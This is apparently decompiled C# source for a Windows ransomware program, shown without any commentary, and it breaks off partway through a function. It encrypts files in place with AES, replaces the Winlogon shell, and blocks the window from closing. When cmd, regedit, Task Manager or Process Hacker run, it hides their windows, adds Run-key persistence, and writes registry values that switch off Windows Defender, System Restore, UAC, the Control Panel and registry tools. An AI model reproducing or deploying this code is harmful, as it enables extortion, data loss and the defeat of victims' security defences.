using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Ransom;

public class Ransom : Form
{
	public class CoreEncryption
	{
		public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class CoreDecryption
	{
		public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class EncryptionFile
	{
		public void EncryptFile(string file, string password)
		{
			byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, bytes);
			File.WriteAllBytes(file, bytes2);
		}
	}

	public class DecryptionFile
	{
		public void DecryptFile(string fileEncrypted, string password)
		{
			byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreDecryption.AES_Decrypt(bytesToBeDecrypted, bytes);
			File.WriteAllBytes(fileEncrypted, bytes2);
		}
	}

	private const int SW_HIDE = 0;

	private const int SW_SHOW = 5;

	private IContainer components = null;

	private Button button1;

	private Label label3;

	private TextBox textBox1;

	private Timer tmr_if;

	private Timer tmr_del;

	private Timer tmr_encrypt;

	private Timer tmr_decrypt;

	[DllImport("User32")]
	private static extern int ShowWindow(int hwnd, int nCmdShow);

	public Ransom()
	{
		InitializeComponent();
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)textBox1).get_Text() == "56483865475645657")
		{
			MessageBox.Show("The key is correct", "CORRECT KEY", (MessageBoxButtons)0, (MessageBoxIcon)64);
			RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
			registryKey.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
			RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey2.SetValue("DisableTaskMgr", "", RegistryValueKind.String);
			tmr_decrypt.Start();
		}
		else
		{
			((Control)textBox1).set_Text("");
		}
	}

	private void label3_Click(object sender, EventArgs e)
	{
	}

	private void Ransom_Load(object sender, EventArgs e)
	{
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
		registryKey.SetValue("Wallpaper", "", RegistryValueKind.String);
		RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
		registryKey2.SetValue("Shell", "empty", RegistryValueKind.String);
		RegistryKey registryKey3 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey3.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
		tmr_encrypt.Start();
		tmr_if.Start();
	}

	private void Ransom_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void tmr_if_Tick(object sender, EventArgs e)
	{
		//IL_0397: Unknown result type (might be due to invalid IL or missing references)
		//IL_0715: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a93: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e11: Unknown result type (might be due to invalid IL or missing references)
		//IL_118f: Unknown result type (might be due to invalid IL or missing references)
		tmr_if.Stop();
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (process.ProcessName == "cmd")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				registryKey.SetValue("Ransom", Application.get_ExecutablePath().ToString());
				RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender");
				registryKey2.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord);
				RegistryKey registryKey3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender");
				registryKey3.SetValue("DisableRoutinelyTakingAction", 1, RegistryValueKind.DWord);
				RegistryKey registryKey4 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey4.SetValue("WindowsDefenderMAJ", 1, RegistryValueKind.DWord);
				RegistryKey registryKey5 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey5.SetValue("WindowsDefenderMAJ", 1, RegistryValueKind.DWord);
				RegistryKey registryKey6 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows Script Host\\Settings");
				registryKey6.SetValue("Enabled", 0, RegistryValueKind.DWord);
				RegistryKey registryKey7 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows Script Host\\Settings");
				registryKey7.SetValue("Enabled", 0, RegistryValueKind.DWord);
				RegistryKey registryKey8 = Registry.LocalMachine.CreateSubKey("Software\\Policies\\Microsoft\\Windows NT\\SystemRestores");
				registryKey8.SetValue("DisableSR", 1, RegistryValueKind.DWord);
				RegistryKey registryKey9 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows NT\\SystemRestores");
				registryKey9.SetValue("DisableSR", 1, RegistryValueKind.DWord);
				RegistryKey registryKey10 = Registry.LocalMachine.CreateSubKey("Software\\Policies\\Microsoft\\Windows NT\\SystemRestores");
				registryKey10.SetValue("DisableConfig", 1, RegistryValueKind.DWord);
				RegistryKey registryKey11 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows NT\\SystemRestores");
				registryKey11.SetValue("DisableConfig", 1, RegistryValueKind.DWord);
				RegistryKey registryKey12 = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Services");
				registryKey12.SetValue("USBTOR", 4, RegistryValueKind.DWord);
				RegistryKey registryKey13 = Registry.CurrentUser.CreateSubKey("SYSTEM\\CurrentControlSet\\Services");
				registryKey13.SetValue("USBTOR", 4, RegistryValueKind.DWord);
				RegistryKey registryKey14 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows");
				registryKey14.SetValue("DisableCMD", 2, RegistryValueKind.DWord);
				RegistryKey registryKey15 = Registry.LocalMachine.CreateSubKey("Software\\Policies\\Microsoft\\MMC\\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}");
				registryKey15.SetValue("Restrict_Run", 1, RegistryValueKind.DWord);
				RegistryKey registryKey16 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\MMC\\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}");
				registryKey16.SetValue("Restrict_Run", 1, RegistryValueKind.DWord);
				RegistryKey registryKey17 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection");
				registryKey17.SetValue("DisableRealtimeMonitoring", 1, RegistryValueKind.DWord);
				RegistryKey registryKey18 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection");
				registryKey18.SetValue("DisableRealtimeMonitoring", 1, RegistryValueKind.DWord);
				RegistryKey registryKey19 = Registry.CurrentUser.CreateSubKey("SYSTEM\\CurrentControlSet\\Services");
				registryKey19.SetValue("SecurityHealthService", 4, RegistryValueKind.DWord);
				RegistryKey registryKey20 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey20.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
				RegistryKey registryKey21 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
				registryKey21.SetValue("NoControlPanel", 1, RegistryValueKind.DWord);
				RegistryKey registryKey22 = Registry.LocalMachine.CreateSubKey("System\\CurrentControlSet\\Control\\SafeBoot\\Minimal");
				registryKey22.SetValue("MinimalX", 1, RegistryValueKind.DWord);
				RegistryKey registryKey23 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey23.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
				Form2 form = new Form2();
				((Form)form).ShowDialog();
			}
			if (process.ProcessName == "regedit")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
				RegistryKey registryKey24 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				registryKey24.SetValue("Ransom", Application.get_ExecutablePath().ToString());
				RegistryKey registryKey25 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender");
				registryKey25.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord);
				RegistryKey registryKey26 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender");
				registryKey26.SetValue("DisableRoutinelyTakingAction", 1, RegistryValueKind.DWord);
				RegistryKey registryKey27 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey27.SetValue("WindowsDefenderMAJ", 1, RegistryValueKind.DWord);
				RegistryKey registryKey28 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey28.SetValue("WindowsDefenderMAJ", 1, RegistryValueKind.DWord);
				RegistryKey registryKey29 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows Script Host\\Settings");
				registryKey29.SetValue("Enabled", 0, RegistryValueKind.DWord);
				RegistryKey registryKey30 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows Script Host\\Settings");
				registryKey30.SetValue("Enabled", 0, RegistryValueKind.DWord);
				RegistryKey registryKey31 = Registry.LocalMachine.CreateSubKey("Software\\Policies\\Microsoft\\Windows NT\\SystemRestores");
				registryKey31.SetValue("DisableSR", 1, RegistryValueKind.DWord);
				RegistryKey registryKey32 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows NT\\SystemRestores");
				registryKey32.SetValue("DisableSR", 1, RegistryValueKind.DWord);
				RegistryKey registryKey33 = Registry.LocalMachine.CreateSubKey("Software\\Policies\\Microsoft\\Windows NT\\SystemRestores");
				registryKey33.SetValue("DisableConfig", 1, RegistryValueKind.DWord);
				RegistryKey registryKey34 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows NT\\SystemRestores");
				registryKey34.SetValue("DisableConfig", 1, RegistryValueKind.DWord);
				RegistryKey registryKey35 = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Services");
				registryKey35.SetValue("USBTOR", 4, RegistryValueKind.DWord);
				RegistryKey registryKey36 = Registry.CurrentUser.CreateSubKey("SYSTEM\\CurrentControlSet\\Services");
				registryKey36.SetValue("USBTOR", 4, RegistryValueKind.DWord);
				RegistryKey registryKey37 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows");
				registryKey37.SetValue("DisableCMD", 2, RegistryValueKind.DWord);
				RegistryKey registryKey38 = Registry.LocalMachine.CreateSubKey("Software\\Policies\\Microsoft\\MMC\\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}");
				registryKey38.SetValue("Restrict_Run", 1, RegistryValueKind.DWord);
				RegistryKey registryKey39 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\MMC\\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}");
				registryKey39.SetValue("Restrict_Run", 1, RegistryValueKind.DWord);
				RegistryKey registryKey40 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection");
				registryKey40.SetValue("DisableRealtimeMonitoring", 1, RegistryValueKind.DWord);
				RegistryKey registryKey41 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection");
				registryKey41.SetValue("DisableRealtimeMonitoring", 1, RegistryValueKind.DWord);
				RegistryKey registryKey42 = Registry.CurrentUser.CreateSubKey("SYSTEM\\CurrentControlSet\\Services");
				registryKey42.SetValue("SecurityHealthService", 4, RegistryValueKind.DWord);
				RegistryKey registryKey43 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey43.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
				RegistryKey registryKey44 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
				registryKey44.SetValue("NoControlPanel", 1, RegistryValueKind.DWord);
				RegistryKey registryKey45 = Registry.LocalMachine.CreateSubKey("System\\CurrentControlSet\\Control\\SafeBoot\\Minimal");
				registryKey45.SetValue("MinimalX", 1, RegistryValueKind.DWord);
				RegistryKey registryKey46 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey46.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
				Form2 form2 = new Form2();
				((Form)form2).ShowDialog();
			}
			if (process.ProcessName == "Processhacker")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
				RegistryKey registryKey47 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				registryKey47.SetValue("Ransom", Application.get_ExecutablePath().ToString());
				RegistryKey registryKey48 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender");
				registryKey48.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord);
				RegistryKey registryKey49 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender");
				registryKey49.SetValue("DisableRoutinelyTakingAction", 1, RegistryValueKind.DWord);
				RegistryKey registryKey50 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey50.SetValue("WindowsDefenderMAJ", 1, RegistryValueKind.DWord);
				RegistryKey registryKey51 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey51.SetValue("WindowsDefenderMAJ", 1, RegistryValueKind.DWord);
				RegistryKey registryKey52 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows Script Host\\Settings");
				registryKey52.SetValue("Enabled", 0, RegistryValueKind.DWord);
				RegistryKey registryKey53 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows Script Host\\Settings");
				registryKey53.SetValue("Enabled", 0, RegistryValueKind.DWord);
				RegistryKey registryKey54 = Registry.LocalMachine.CreateSubKey("Software\\Policies\\Microsoft\\Windows NT\\SystemRestores");
				registryKey54.SetValue("DisableSR", 1, RegistryValueKind.DWord);
				RegistryKey registryKey55 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows NT\\SystemRestores");
				registryKey55.SetValue("DisableSR", 1, RegistryValueKind.DWord);
				RegistryKey registryKey56 = Registry.LocalMachine.CreateSubKey("Software\\Policies\\Microsoft\\Windows NT\\SystemRestores");
				registryKey56.SetValue("DisableConfig", 1, RegistryValueKind.DWord);
				RegistryKey registryKey57 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows NT\\SystemRestores");
				registryKey57.SetValue("DisableConfig", 1, RegistryValueKind.DWord);
				RegistryKey registryKey58 = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Services");
				registryKey58.SetValue("USBTOR", 4, RegistryValueKind.DWord);
				RegistryKey registryKey59 = Registry.CurrentUser.CreateSubKey("SYSTEM\\CurrentControlSet\\Services");
				registryKey59.SetValue("USBTOR", 4, RegistryValueKind.DWord);
				RegistryKey registryKey60 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows");
				registryKey60.SetValue("DisableCMD", 2, RegistryValueKind.DWord);
				RegistryKey registryKey61 = Registry.LocalMachine.CreateSubKey("Software\\Policies\\Microsoft\\MMC\\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}");
				registryKey61.SetValue("Restrict_Run", 1, RegistryValueKind.DWord);
				RegistryKey registryKey62 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\MMC\\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}");
				registryKey62.SetValue("Restrict_Run", 1, RegistryValueKind.DWord);
				RegistryKey registryKey63 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection");
				registryKey63.SetValue("DisableRealtimeMonitoring", 1, RegistryValueKind.DWord);
				RegistryKey registryKey64 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection");
				registryKey64.SetValue("DisableRealtimeMonitoring", 1, RegistryValueKind.DWord);
				RegistryKey registryKey65 = Registry.CurrentUser.CreateSubKey("SYSTEM\\CurrentControlSet\\Services");
				registryKey65.SetValue("SecurityHealthService", 4, RegistryValueKind.DWord);
				RegistryKey registryKey66 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey66.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
				RegistryKey registryKey67 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
				registryKey67.SetValue("NoControlPanel", 1, RegistryValueKind.DWord);
				RegistryKey registryKey68 = Registry.LocalMachine.CreateSubKey("System\\CurrentControlSet\\Control\\SafeBoot\\Minimal");
				registryKey68.SetValue("MinimalX", 1, RegistryValueKind.DWord);
				RegistryKey registryKey69 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey69.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
				Form2 form3 = new Form2();
				((Form)form3).ShowDialog();
			}
			if (process.ProcessName == "sdclt")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
				RegistryKey registryKey70 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				registryKey70.SetValue("Ransom", Application.get_ExecutablePath().ToString());
				RegistryKey registryKey71 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender");
				registryKey71.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord);
				RegistryKey registryKey72 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender");
				registryKey72.SetValue("DisableRoutinelyTakingAction", 1, RegistryValueKind.DWord);
				RegistryKey registryKey73 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey73.SetValue("WindowsDefenderMAJ", 1, RegistryValueKind.DWord);
				RegistryKey registryKey74 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey74.SetValue("WindowsDefenderMAJ", 1, RegistryValueKind.DWord);
				RegistryKey registryKey75 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows Script Host\\Settings");
				registryKey75.SetValue("Enabled", 0, RegistryValueKind.DWord);
				RegistryKey registryKey76 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows Script Host\\Settings");
				registryKey76.SetValue("Enabled", 0, RegistryValueKind.DWord);
				RegistryKey registryKey77 = Registry.LocalMachine.CreateSubKey("Software\\Policies\\Microsoft\\Windows NT\\SystemRestores");
				registryKey77.SetValue("DisableSR", 1, RegistryValueKind.DWord);
				RegistryKey registryKey78 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows NT\\SystemRestores");
				registryKey78.SetValue("DisableSR", 1, RegistryValueKind.DWord);
				RegistryKey registryKey79 = Registry.LocalMachine.CreateSubKey("Software\\Policies\\Microsoft\\Windows NT\\SystemRestores");
				registryKey79.SetValue("DisableConfig", 1, RegistryValueKind.DWord);
				RegistryKey registryKey80 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows NT\\SystemRestores");
				registryKey80.SetValue("DisableConfig", 1, RegistryValueKind.DWord);
				RegistryKey registryKey81 = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Services");
				registryKey81.SetValue("USBTOR", 4, RegistryValueKind.DWord);
				RegistryKey registryKey82 = Registry.CurrentUser.CreateSubKey("SYSTEM\\CurrentControlSet\\Services");
				registryKey82.SetValue("USBTOR", 4, RegistryValueKind.DWord);
				RegistryKey registryKey83 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows");
				registryKey83.SetValue("DisableCMD", 2, RegistryValueKind.DWord);
				RegistryKey registryKey84 = Registry.LocalMachine.CreateSubKey("Software\\Policies\\Microsoft\\MMC\\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}");
				registryKey84.SetValue("Restrict_Run", 1, RegistryValueKind.DWord);
				RegistryKey registryKey85 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\MMC\\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}");
				registryKey85.SetValue("Restrict_Run", 1, RegistryValueKind.DWord);
				RegistryKey registryKey86 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection");
				registryKey86.SetValue("DisableRealtimeMonitoring", 1, RegistryValueKind.DWord);
				RegistryKey registryKey87 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection");
				registryKey87.SetValue("DisableRealtimeMonitoring", 1, RegistryValueKind.DWord);
				RegistryKey registryKey88 = Registry.CurrentUser.CreateSubKey("SYSTEM\\CurrentControlSet\\Services");
				registryKey88.SetValue("SecurityHealthService", 4, RegistryValueKind.DWord);
				RegistryKey registryKey89 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey89.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
				RegistryKey registryKey90 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
				registryKey90.SetValue("NoControlPanel", 1, RegistryValueKind.DWord);
				RegistryKey registryKey91 = Registry.LocalMachine.CreateSubKey("System\\CurrentControlSet\\Control\\SafeBoot\\Minimal");
				registryKey91.SetValue("MinimalX", 1, RegistryValueKind.DWord);
				RegistryKey registryKey92 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey92.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
				Form2 form4 = new Form2();
				((Form)form4).ShowDialog();
			}
			if (process.ProcessName == "taskmgr")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
				RegistryKey registryKey93 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				registryKey93.SetValue("Ransom", Application.get_ExecutablePath().ToString());
				RegistryKey registryKey94 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender");
				registryKey94.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord);
				RegistryKey registryKey95 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender");
				registryKey95.SetValue("DisableRoutinelyTakingAction", 1, RegistryValueKind.DWord);
				RegistryKey registryKey96 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey96.SetValue("WindowsDefenderMAJ", 1, RegistryValueKind.DWord);
				RegistryKey registryKey97 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey97.SetValue("WindowsDefenderMAJ", 1, RegistryValueKind.DWord);
				RegistryKey registryKey98 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows Script Host\\Settings");
				registryKey98.SetValue("Enabled", 0, RegistryValueKind.DWord);
				RegistryKey registryKey99 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows Script Host\\Settings");
				registryKey99.SetValue("Enabled", 0, RegistryValueKind.DWord);
				RegistryKey registryKey100 = Registry.LocalMachine.CreateSubKey("Software\\Policies\\Microsoft\\Windows NT\\SystemRestores");
				registryKey100.SetValue("DisableSR", 1, RegistryValueKind.DWord);
				RegistryKey registryKey101 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows NT\\SystemRestores");
				registryKey101.SetValue("DisableSR", 1, RegistryValueKind.DWord);
				RegistryKey registryKey102 = Registry.LocalMachine.CreateSubKey("Software\\Policies\\Microsoft\\Windows NT\\SystemRestores");
				registryKey102.SetValue("DisableConfig", 1, RegistryValueKind.DWord);
				RegistryKey registryKey103 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows NT\\SystemRestores");
				registryKey103.SetValue("DisableConfig", 1, RegistryValueKind.DWord);
				RegistryKey registryKey104 = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Services");
				registryKey104.SetValue("USBTOR", 4, RegistryValueKind.DWord);
				RegistryKey registryKey105 = Registry.CurrentUser.CreateSubKey("SYSTEM\\CurrentControlSet\\Services");
				registryKey105.SetValue("USBTOR", 4, RegistryValueKind.DWord);
				RegistryKey registryKey106 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows");
				registryKey106.SetValue("DisableCMD", 2, RegistryValueKind.DWord);
				RegistryKey registryKey107 = Registry.LocalMachine.CreateSubKey("Software\\Policies\\Microsoft\\MMC\\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}");
				registryKey107.SetValue("Restrict_Run", 1, RegistryValueKind.DWord);
				RegistryKey registryKey108 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\MMC\\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}");
				registryKey108.SetValue("Restrict_Run", 1, RegistryValueKind.DWord);
				RegistryKey registryKey109 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection");
				registryKey109.SetValue("DisableRealtimeMonitoring", 1, RegistryValueKind.DWord);
				RegistryKey registryKey110 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection");
				registryKey110.SetValue("DisableRealtimeMonitoring", 1, RegistryValueKind.DWord);
				RegistryKey registryKey111 = Registry.CurrentUser.CreateSubKey("SYSTEM\\CurrentControlSet\\Services");
				registryKey111.SetValue("SecurityHealthService", 4, RegistryValueKind.DWord);
				RegistryKey registryKey112 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey112.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
				RegistryKey registryKey113 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
